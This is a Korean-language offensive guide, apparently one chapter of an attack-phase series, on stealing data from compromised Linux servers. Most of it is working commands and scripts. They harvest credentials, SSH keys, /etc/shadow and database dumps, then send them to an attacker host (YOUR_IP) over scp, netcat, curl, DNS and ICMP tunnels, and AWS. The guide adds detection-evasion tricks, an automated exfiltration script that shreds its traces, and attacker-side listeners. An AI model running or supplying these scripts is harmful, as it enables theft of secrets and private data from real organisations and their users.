# Phase 7: 데이터 탈취 (Data Exfiltration)

## 개요
데이터 탈취는 침해된 시스템에서 중요한 정보(데이터베이스, 설정 파일, 사용자 정보, AWS 키 등)를 외부로 전송하는 과정입니다. 탐지를 회피하면서 대용량 데이터를 안전하게 추출하는 기법을 다룹니다.

## 필수 도구
- curl / wget
- scp / rsync
- netcat
- base64
- Python
- AWS CLI
- tar / gzip

---

## 1. 중요 데이터 식별

### 1.1 데이터베이스 설정 파일
```bash
# MySQL/MariaDB 설정
cat /etc/mysql/my.cnf
cat /etc/mysql/mysql.conf.d/mysqld.cnf
cat ~/.my.cnf

# PostgreSQL 설정
cat /etc/postgresql/*/main/postgresql.conf
cat /var/lib/postgresql/.pgpass

# MongoDB 설정
cat /etc/mongod.conf

# 웹 애플리케이션 DB 설정
find /var/www -name "config.php" -o -name "database.yml" -o -name "settings.py" 2>/dev/null
cat /var/www/html/config.php
cat /var/www/html/wp-config.php  # WordPress
cat /var/www/html/.env            # Laravel, Django 등
```

### 1.2 AWS/클라우드 자격증명
```bash
# AWS CLI 설정
cat ~/.aws/credentials
cat ~/.aws/config

# AWS 환경 변수
env | grep AWS

# EC2 인스턴스 메타데이터 (이미 획득한 경우)
cat /tmp/aws_credentials.json

# GCP 설정
cat ~/.config/gcloud/credentials.db
cat ~/.config/gcloud/application_default_credentials.json

# Azure 설정
cat ~/.azure/credentials
```

### 1.3 SSH 키 및 인증 정보
```bash
# SSH 개인키
find /home -name "id_rsa" 2>/dev/null
find /home -name "id_dsa" 2>/dev/null
find /root -name "id_*" 2>/dev/null
cat /root/.ssh/id_rsa

# SSH known_hosts (다른 서버 정보)
cat ~/.ssh/known_hosts
cat /root/.ssh/known_hosts

# 인증 토큰
find / -name ".git-credentials" 2>/dev/null
find / -name ".netrc" 2>/dev/null
cat ~/.git-credentials
cat ~/.netrc
```

### 1.4 웹 애플리케이션 데이터
```bash
# 업로드된 파일
ls -la /var/www/html/uploads/
find /var/www -type f -name "*.pdf" -o -name "*.docx" -o -name "*.xlsx" 2>/dev/null

# 세션 파일
ls -la /var/lib/php/sessions/
cat /var/lib/php/sessions/sess_*

# 로그 파일 (중요 정보 포함 가능)
cat /var/www/html/logs/*.log
grep -ri "password" /var/www/html/logs/
grep -ri "api_key" /var/www/html/logs/
```

### 1.5 사용자 데이터
```bash
# 비밀번호 해시
cat /etc/shadow

# 사용자 정보
cat /etc/passwd

# 브라우저 저장 데이터 (사용자 홈 디렉토리)
find /home -name "*.sqlite" 2>/dev/null  # Firefox, Chrome 데이터
find /home -name "Cookies" 2>/dev/null
find /home -name "Login Data" 2>/dev/null
```

### 1.6 기업 민감 데이터
```bash
# 문서 파일
find / -name "*.pdf" -o -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" 2>/dev/null | head -20

# 백업 파일
find / -name "*.sql" -o -name "*.dump" -o -name "*.bak" 2>/dev/null
find / -name "*backup*" 2>/dev/null

# 압축 파일
find / -name "*.tar.gz" -o -name "*.zip" -o -name "*.7z" 2>/dev/null
```

---

## 2. 데이터베이스 덤프

### 2.1 MySQL/MariaDB 덤프
```bash
# 전체 데이터베이스 덤프
mysqldump -u root -p'PASSWORD' --all-databases > /tmp/all_databases.sql

# 특정 데이터베이스
mysqldump -u root -p'PASSWORD' database_name > /tmp/database.sql

# 테이블 구조만
mysqldump -u root -p'PASSWORD' --no-data database_name > /tmp/schema.sql

# 압축하여 덤프
mysqldump -u root -p'PASSWORD' --all-databases | gzip > /tmp/databases.sql.gz

# 원격으로 바로 전송
mysqldump -u root -p'PASSWORD' --all-databases | ssh user@YOUR_IP "cat > /tmp/dump.sql"
```

### 2.2 MySQL 쿼리로 데이터 추출
```bash
# MySQL 접속
mysql -u root -p'PASSWORD'

# 사용자 목록
SELECT user, host, password FROM mysql.user;

# 특정 테이블 데이터
USE application_db;
SELECT * FROM users;
SELECT username, email, password FROM users WHERE role='admin';

# 파일로 저장
SELECT * FROM users INTO OUTFILE '/tmp/users.csv' FIELDS TERMINATED BY ',' ENCLOSED BY '"' LINES TERMINATED BY '\n';

# Base64 인코딩하여 추출 (방화벽 우회)
SELECT TO_BASE64(password) FROM users;
```

### 2.3 PostgreSQL 덤프
```bash
# 전체 덤프
pg_dumpall -U postgres > /tmp/all_databases.sql

# 특정 데이터베이스
pg_dump -U postgres database_name > /tmp/database.sql

# 압축
pg_dump -U postgres database_name | gzip > /tmp/database.sql.gz

# 커스텀 포맷 (더 빠른 복원)
pg_dump -U postgres -Fc database_name > /tmp/database.dump
```

### 2.4 SQLite 덤프
```bash
# SQLite 데이터베이스 찾기
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null

# 덤프
sqlite3 /var/www/html/database.db .dump > /tmp/sqlite_dump.sql

# 테이블 확인
sqlite3 /var/www/html/database.db "SELECT name FROM sqlite_master WHERE type='table';"

# 데이터 추출
sqlite3 /var/www/html/database.db "SELECT * FROM users;" > /tmp/users.txt
```

---

## 3. 파일 전송 기법

### 3.1 SCP (Secure Copy)
```bash
# 단일 파일 전송
scp /etc/shadow user@YOUR_IP:/tmp/

# 디렉토리 전송
scp -r /var/www/html user@YOUR_IP:/tmp/backup/

# 압축하여 전송
tar czf - /var/www/html | ssh user@YOUR_IP "cat > /tmp/html.tar.gz"

# 포트 변경
scp -P 2222 /etc/passwd user@YOUR_IP:/tmp/
```

### 3.2 Rsync
```bash
# 효율적인 파일 동기화
rsync -avz /var/www/html/ user@YOUR_IP:/tmp/backup/

# SSH 포트 변경
rsync -avz -e "ssh -p 2222" /var/www/html/ user@YOUR_IP:/tmp/backup/

# 진행상황 표시
rsync -avz --progress /var/www/html/ user@YOUR_IP:/tmp/backup/

# 특정 파일 타입만
rsync -avz --include="*.php" --include="*.sql" --exclude="*" /var/www/ user@YOUR_IP:/tmp/
```

### 3.3 Netcat (방화벽 우회)
```bash
# 공격자 머신 (리스너)
nc -lvnp 4444 > received_file.tar.gz

# 대상 서버 (전송)
tar czf - /var/www/html | nc YOUR_IP 4444

# 역방향 (대상 서버가 리스너)
# 대상 서버:
nc -lvnp 4444 < /etc/shadow

# 공격자 머신:
nc TARGET_IP 4444 > shadow
```

### 3.4 HTTP/HTTPS 업로드
```bash
# 공격자 머신에서 HTTP 서버 (업로드 수신)
# Python 업로드 서버
python3 << 'EOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
import os

class UploadHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        filename = self.headers.get('X-Filename', 'upload.bin')
        with open(f'/tmp/{filename}', 'wb') as f:
            f.write(self.rfile.read(length))
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), UploadHandler).serve_forever()
EOF

# 대상 서버에서 업로드
curl -X POST -H "X-Filename: database.sql" --data-binary "@/tmp/database.sql" http://YOUR_IP:8080/

# 또는 wget
wget --post-file=/etc/shadow http://YOUR_IP:8080/
```

### 3.5 DNS Tunneling (매우 은밀)
```bash
# dnscat2 사용
# 공격자 머신:
ruby dnscat2.rb yourdomain.com

# 대상 서버:
./dnscat yourdomain.com

# 파일 전송
download /etc/shadow
upload malware.elf /tmp/malware
```

### 3.6 ICMP Tunneling
```bash
# ptunnel 사용
# 공격자 머신:
ptunnel -x password

# 대상 서버:
ptunnel -p YOUR_IP -lp 8000 -da TARGET_IP -dp 22 -x password

# SSH over ICMP
ssh -p 8000 localhost
```

---

## 4. Base64 인코딩 전송

### 4.1 작은 파일 Base64 인코딩
```bash
# 파일을 Base64로 인코딩
base64 /etc/shadow > /tmp/shadow.b64

# 출력 복사하여 공격자 머신에서 디코딩
cat /tmp/shadow.b64

# 공격자 머신:
echo "BASE64_STRING" | base64 -d > shadow

# 한 줄로
cat /etc/shadow | base64 -w 0
```

### 4.2 큰 파일 청크로 분할
```bash
# 파일 압축 및 Base64 인코딩
tar czf - /var/www/html | base64 > /tmp/html.b64

# 1MB씩 분할
split -b 1M /tmp/html.b64 /tmp/chunk_

# 각 청크 전송 후 합치기
cat /tmp/chunk_* | base64 -d | tar xzf -
```

---

## 5. AWS를 통한 데이터 탈취

### 5.1 S3로 업로드
```bash
# AWS 자격증명 설정 (이미 획득한 경우)
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# S3 버킷 생성 (권한이 있는 경우)
aws s3 mb s3://exfiltrated-data-$(date +%s)

# 파일 업로드
aws s3 cp /etc/shadow s3://exfiltrated-data-123456/shadow
aws s3 cp /tmp/database.sql s3://exfiltrated-data-123456/

# 디렉토리 업로드
aws s3 sync /var/www/html s3://exfiltrated-data-123456/html/

# 공개 접근 설정 (위험!)
aws s3api put-object-acl --bucket exfiltrated-data-123456 --key shadow --acl public-read
```

### 5.2 EC2 스냅샷 생성
```bash
# 볼륨 ID 확인
aws ec2 describe-volumes

# 스냅샷 생성
aws ec2 create-snapshot --volume-id vol-1234567890abcdef0 --description "Exfiltrated data"

# 스냅샷 공유 (다른 계정으로)
aws ec2 modify-snapshot-attribute --snapshot-id snap-1234567890abcdef0 --attribute createVolumePermission --operation-type add --user-ids 123456789012
```

### 5.3 Systems Manager (SSM) Parameter Store
```bash
# 작은 데이터를 Parameter Store에 저장
aws ssm put-parameter --name "/exfiltrated/shadow" --value "$(cat /etc/shadow)" --type SecureString

# 나중에 다른 곳에서 읽기
aws ssm get-parameter --name "/exfiltrated/shadow" --with-decryption
```

---

## 6. 스텔스 기법 (탐지 회피)

### 6.1 정상 트래픽으로 위장
```bash
# User-Agent 위장
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -X POST --data-binary "@/tmp/data.sql" http://YOUR_IP:8080/

# HTTPS 사용 (암호화)
curl -k -X POST --data-binary "@/tmp/database.sql" https://YOUR_IP:8443/upload

# DNS 쿼리로 위장
# 데이터를 DNS 쿼리에 포함
DATA=$(cat /etc/passwd | base64 -w 0)
nslookup ${DATA:0:63}.yourdomain.com
```

### 6.2 속도 제한 (느린 전송)
```bash
# 대역폭 제한 (1MB/s)
rsync -avz --bwlimit=1000 /var/www/html/ user@YOUR_IP:/tmp/

# pv로 속도 제한
cat large_file.sql | pv -L 500k | nc YOUR_IP 4444

# 시간 간격을 두고 전송
for file in /tmp/chunk_*; do
    curl -X POST --data-binary "@$file" http://YOUR_IP:8080/
    sleep 60  # 1분 대기
done
```

### 6.3 파일 암호화
```bash
# OpenSSL로 암호화
openssl enc -aes-256-cbc -salt -in /tmp/database.sql -out /tmp/database.enc -k "password123"

# 전송
curl -X POST --data-binary "@/tmp/database.enc" http://YOUR_IP:8080/

# 공격자 머신에서 복호화
openssl enc -aes-256-cbc -d -in database.enc -out database.sql -k "password123"

# GPG 암호화
gpg -c /tmp/database.sql  # database.sql.gpg 생성
# 복호화
gpg -d database.sql.gpg > database.sql
```

### 6.4 스테가노그래피 (이미지에 숨기기)
```bash
# steghide 사용
steghide embed -cf image.jpg -ef /etc/shadow -p password123

# 이미지 전송 (정상 트래픽처럼 보임)
curl -X POST -F "image=@image.jpg" http://YOUR_IP:8080/upload

# 공격자 머신에서 추출
steghide extract -sf image.jpg -p password123
```

---

## 7. 자동화 스크립트

### 7.1 완전 자동 데이터 탈취 스크립트
```bash
#!/bin/bash
# auto_exfiltrate.sh - 자동 데이터 탈취

ATTACKER_IP="YOUR_IP"
ATTACKER_PORT="8080"
OUTPUT_DIR="/tmp/.hidden_exfil"

mkdir -p $OUTPUT_DIR

echo "[*] Starting automated data exfiltration..."

# 1. 데이터베이스 덤프
echo "[*] Dumping databases..."
if command -v mysqldump &>/dev/null; then
    MYSQL_PASS=$(grep password /var/www/html/config.php 2>/dev/null | head -1 | cut -d"'" -f4)
    mysqldump -u root -p"$MYSQL_PASS" --all-databases 2>/dev/null | gzip > $OUTPUT_DIR/mysql_dump.sql.gz
fi

# 2. 설정 파일 수집
echo "[*] Collecting config files..."
find /var/www -name "config.php" -o -name ".env" -o -name "database.yml" 2>/dev/null | xargs tar czf $OUTPUT_DIR/configs.tar.gz 2>/dev/null

# 3. AWS 자격증명
echo "[*] Collecting AWS credentials..."
if [ -f ~/.aws/credentials ]; then
    cp ~/.aws/credentials $OUTPUT_DIR/aws_creds.txt
fi

# 4. SSH 키
echo "[*] Collecting SSH keys..."
find /home /root -name "id_rsa" 2>/dev/null | xargs tar czf $OUTPUT_DIR/ssh_keys.tar.gz 2>/dev/null

# 5. /etc/shadow
echo "[*] Copying /etc/shadow..."
cp /etc/shadow $OUTPUT_DIR/shadow 2>/dev/null

# 6. 압축 및 암호화
echo "[*] Compressing and encrypting..."
tar czf - $OUTPUT_DIR | openssl enc -aes-256-cbc -salt -k "SecretPass123" > /tmp/exfil.enc

# 7. 전송
echo "[*] Exfiltrating data..."
curl -X POST --data-binary "@/tmp/exfil.enc" http://$ATTACKER_IP:$ATTACKER_PORT/upload

# 8. 정리
echo "[*] Cleaning up..."
shred -vfz -n 10 /tmp/exfil.enc
rm -rf $OUTPUT_DIR

echo "[+] Exfiltration complete!"
```

### 7.2 Python 다중 채널 탈취
```python
#!/usr/bin/env python3
# multi_exfil.py - 여러 경로로 동시 탈취

import os
import subprocess
import base64
import requests
from concurrent.futures import ThreadPoolExecutor

ATTACKER_IP = "YOUR_IP"
TARGET_FILE = "/etc/shadow"

def exfil_http():
    """HTTP POST로 전송"""
    try:
        with open(TARGET_FILE, 'rb') as f:
            data = f.read()
        requests.post(f"http://{ATTACKER_IP}:8080/upload", data=data)
        print("[+] HTTP exfiltration successful")
    except Exception as e:
        print(f"[-] HTTP failed: {e}")

def exfil_dns():
    """DNS 쿼리로 전송"""
    try:
        with open(TARGET_FILE, 'rb') as f:
            data = base64.b64encode(f.read()).decode()

        # 63자씩 분할하여 DNS 쿼리
        chunks = [data[i:i+63] for i in range(0, len(data), 63)]
        for i, chunk in enumerate(chunks):
            domain = f"{chunk}.{i}.exfil.yourdomain.com"
            subprocess.run(['nslookup', domain], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

        print("[+] DNS exfiltration successful")
    except Exception as e:
        print(f"[-] DNS failed: {e}")

def exfil_icmp():
    """ICMP 패킷으로 전송"""
    try:
        with open(TARGET_FILE, 'rb') as f:
            data = base64.b64encode(f.read()).decode()

        # ICMP 패킷 데이터에 포함
        subprocess.run(['ping', '-c', '1', '-p', data[:32], ATTACKER_IP],
                      stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

        print("[+] ICMP exfiltration successful")
    except Exception as e:
        print(f"[-] ICMP failed: {e}")

if __name__ == "__main__":
    print("[*] Starting multi-channel exfiltration...")

    with ThreadPoolExecutor(max_workers=3) as executor:
        executor.submit(exfil_http)
        executor.submit(exfil_dns)
        executor.submit(exfil_icmp)

    print("[+] All exfiltration attempts complete")
```

---

## 8. 공격자 측 수신 서버

### 8.1 Python HTTP 업로드 서버
```python
#!/usr/bin/env python3
# upload_server.py - 파일 수신 서버

from http.server import HTTPServer, BaseHTTPRequestHandler
import os
from datetime import datetime

UPLOAD_DIR = "/tmp/exfiltrated"
os.makedirs(UPLOAD_DIR, exist_ok=True)

class UploadHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        filename = self.headers.get('X-Filename', f'upload_{datetime.now().strftime("%Y%m%d_%H%M%S")}')

        filepath = os.path.join(UPLOAD_DIR, filename)
        with open(filepath, 'wb') as f:
            f.write(self.rfile.read(length))

        print(f"[+] Received: {filename} ({length} bytes)")

        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'OK')

    def log_message(self, format, *args):
        pass  # 로그 숨기기

if __name__ == "__main__":
    print(f"[*] Upload server listening on port 8080")
    print(f"[*] Files will be saved to: {UPLOAD_DIR}")
    HTTPServer(('0.0.0.0', 8080), UploadHandler).serve_forever()
```

### 8.2 Netcat 멀티 리스너
```bash
#!/bin/bash
# multi_listener.sh - 여러 포트에서 동시 수신

mkdir -p /tmp/exfiltrated

echo "[*] Starting listeners on ports 4444, 5555, 6666..."

# 포트 4444
nc -lvnp 4444 > /tmp/exfiltrated/file_4444.bin &

# 포트 5555
nc -lvnp 5555 > /tmp/exfiltrated/file_5555.bin &

# 포트 6666
nc -lvnp 6666 > /tmp/exfiltrated/file_6666.bin &

echo "[+] All listeners started"
wait
```

---

## 핵심 정리

1. 데이터 우선순위 파악 - DB, AWS 키, SSH 키, /etc/shadow 먼저
2. 압축 및 암호화 - 전송 전 항상 압축하고 가능하면 암호화
3. 다중 채널 활용 - HTTP, DNS, ICMP 등 여러 경로로 동시 전송
4. 스텔스 유지 - 느린 속도, 암호화, 정상 트래픽 위장
5. 즉시 정리 - 전송 후 로컬 파일 shred로 완전 삭제

## 다음 단계
Phase 8: 흔적 제거 (Covering Tracks)로 진행하여 침입 흔적 삭제
